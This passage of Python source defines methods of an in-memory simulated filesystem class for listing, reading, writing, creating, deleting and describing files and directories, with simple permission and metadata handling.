    def is_file(self, path: str, current_dir: str = "/") -> bool:
        """Check if path is a file"""
        abs_path = self.resolve_path(path, current_dir)
        node = self._get_node(abs_path)
        return node is not None and not node.is_dir
        
    def list_directory(self, path: str, current_dir: str = "/") -> Optional[List[Dict[str, Any]]]:
        """
        List directory contents with metadata
        
        Returns:
            List of dicts with file info, or None if not a directory
        """
        abs_path = self.resolve_path(path, current_dir)
        node = self._get_node(abs_path)
        
        if not node or not node.is_dir:
            return None
            
        result = []
        for child_name in node.list_children():
            child = node.get_child(child_name)
            result.append({
                "name": child.name,
                "is_dir": child.is_dir,
                "permissions": child.permissions,
                "owner": child.owner,
                "group": child.group,
                "size": child.size,
                "modified": child.modified,
            })
            
        return result
        
    def read_file(self, path: str, current_dir: str = "/") -> Optional[str]:
        """Read file contents"""
        abs_path = self.resolve_path(path, current_dir)
        node = self._get_node(abs_path)
        
        if not node or node.is_dir:
            return None
            
        # Check permissions (simplified - just check if readable)
        if node.permissions[0] == "0":
            return None  # No read permission
            
        return node.content
        
    def write_file(self, path: str, content: str, current_dir: str = "/") -> bool:
        """Write content to a file (create if doesn't exist)"""
        abs_path = self.resolve_path(path, current_dir)
        
        # Get parent directory
        parent_path = "/".join(abs_path.split("/")[:-1]) or "/"
        filename = abs_path.split("/")[-1]
        
        parent = self._get_node(parent_path)
        if not parent or not parent.is_dir:
            return False
            
        # Check if file exists
        existing = parent.get_child(filename)
        if existing:
            if existing.is_dir:
                return False
            existing.content = content
            existing.size = len(content)
            existing.modified = datetime.datetime.now()
        else:
            # Create new file
            new_file = FileNode(filename, content=content, permissions="644")
            parent.add_child(new_file)
            
        return True
        
    def create_directory(self, path: str, current_dir: str = "/") -> bool:
        """Create a directory"""
        abs_path = self.resolve_path(path, current_dir)
        
        # Get parent directory
        parent_path = "/".join(abs_path.split("/")[:-1]) or "/"
        dirname = abs_path.split("/")[-1]
        
        parent = self._get_node(parent_path)
        if not parent or not parent.is_dir:
            return False
            
        # Check if already exists
        if parent.get_child(dirname):
            return False
            
        new_dir = FileNode(dirname, is_dir=True, permissions="755")
        parent.add_child(new_dir)
        return True
        
    def delete(self, path: str, current_dir: str = "/") -> bool:
        """Delete a file or empty directory"""
        abs_path = self.resolve_path(path, current_dir)
        
        if abs_path == "/":
            return False  # Can't delete root
            
        parent_path = "/".join(abs_path.split("/")[:-1]) or "/"
        filename = abs_path.split("/")[-1]
        
        parent = self._get_node(parent_path)
        if not parent or not parent.is_dir:
            return False
            
        node = parent.get_child(filename)
        if not node:
            return False
            
        # Don't delete non-empty directories
        if node.is_dir and node.children:
            return False
            
        del parent.children[filename]
        return True
        
    def get_file_info(self, path: str, current_dir: str = "/") -> Optional[Dict[str, Any]]:
        """Get detailed file information"""
        abs_path = self.resolve_path(path, current_dir)
        node = self._get_node(abs_path)
        
        if not node:
            return None
            
        return {
            "name": node.name,
            "path": abs_path,
            "is_dir": node.is_dir,
            "permissions": node.permissions,
            "owner": node.owner,
            "group": node.group,
            "size": node.size,
            "modified": node.modified,
        }
